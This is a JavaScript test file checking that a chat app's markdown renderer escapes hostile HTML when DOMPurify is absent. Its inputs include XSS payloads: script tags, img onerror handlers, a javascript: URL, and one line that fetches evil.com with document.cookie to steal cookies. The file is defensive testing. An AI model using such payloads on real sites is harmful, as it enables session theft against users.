/**
 * Test for renderMarkdown sanitization fallback
 * Run with: node --test src/js/chat.test.js
 */
const { test } = require('node:test')
const assert = require('node:assert')

// Mock browser globals for testing
global.window = {}
global.console = { warn: () => {}, error: () => {} }

// Import the module after mocking globals
const chatModule = (() => {
  // Inline a minimal version of renderMarkdown for testing
  const markedApi = null // Simulate marked not loaded
  
  function renderMarkdown(text) {
    const source = text || ''
    if (!source) return ''
    
    const escapeHtml = (str) => str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;')
    
    try {
      const parse = markedApi?.parse || markedApi?.marked
      if (typeof parse !== 'function') {
        return `<p>${escapeHtml(source)}</p>`
      }
      
      const html = parse(source)
      
      // SECURITY: Must sanitize with DOMPurify. Never return raw HTML.
      if (!global.window.DOMPurify?.sanitize) {
        console.warn('[chat] DOMPurify not loaded, falling back to escaped text')
        return `<p>${escapeHtml(source)}</p>`
      }
      
      return global.window.DOMPurify.sanitize(html, {
        USE_PROFILES: { html: true },
        ADD_ATTR: ['target', 'rel'],
        FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
        FORBID_ATTR: ['onerror', 'onload', 'onclick'],
      })
    } catch (err) {
      console.error('[chat] renderMarkdown error:', err)
      return `<p>${escapeHtml(source)}</p>`
    }
  }
  
  return { renderMarkdown }
})()

test('renderMarkdown escapes XSS when DOMPurify is missing', () => {
  const malicious = '<script>alert("xss")</script><img src=x onerror=alert(1)>'
  const result = chatModule.renderMarkdown(malicious)
  
  // Should escape dangerous HTML so it becomes text, not executable code
  assert.ok(result.includes('&lt;script&gt;'), 'Should contain escaped script tag')
  assert.ok(result.includes('&lt;img'), 'Should contain escaped img tag')
  assert.ok(!result.match(/<script[^>]*>/), 'Should not contain executable script tag')
  assert.ok(!result.match(/<img[^>]*onerror/), 'Should not contain executable event handler')
  assert.ok(result.startsWith('<p>'), 'Should wrap in paragraph tag')
  assert.ok(result.endsWith('</p>'), 'Should close paragraph tag')
})

test('renderMarkdown handles javascript: URLs in fallback', () => {
  const malicious = '<a href="javascript:alert(1)">click</a>'
  const result = chatModule.renderMarkdown(malicious)
  
  // Should escape the entire link so it's text, not an executable link
  assert.ok(!result.match(/<a[^>]*href/), 'Should not contain executable anchor tag')
  assert.ok(result.includes('&lt;a'), 'Should escape the anchor tag')
  assert.ok(result.includes('javascript:'), 'Literal "javascript:" text is OK when escaped in text content')
})

test('renderMarkdown handles mixed hostile input', () => {
  const hostile = '"><script>alert(document.cookie)</script><img src=x onerror="fetch(\'evil.com?c=\'+document.cookie)">'
  const result = chatModule.renderMarkdown(hostile)
  
  // All tags should be escaped and inert
  assert.ok(!result.match(/<script[^>]*>/), 'Should not contain executable script tags')
  assert.ok(!result.match(/<img[^>]*onerror/), 'Should not contain executable event handlers')
  assert.ok(result.includes('&quot;&gt;&lt;script&gt;'), 'Should properly escape injection attempt')
  assert.ok(result.includes('&lt;img'), 'Should escape img tag')
})

test('renderMarkdown returns empty string for empty input', () => {
  assert.strictEqual(chatModule.renderMarkdown(''), '')
  assert.strictEqual(chatModule.renderMarkdown(null), '')
  assert.strictEqual(chatModule.renderMarkdown(undefined), '')
})

test('renderMarkdown handles plain text safely', () => {
  const plain = 'Hello world'
  const result = chatModule.renderMarkdown(plain)
  
  assert.ok(result.includes('Hello world'), 'Should contain the text')
  assert.ok(result.startsWith('<p>'), 'Should wrap in paragraph')
  assert.strictEqual(result, '<p>Hello world</p>', 'Should produce clean paragraph')
})
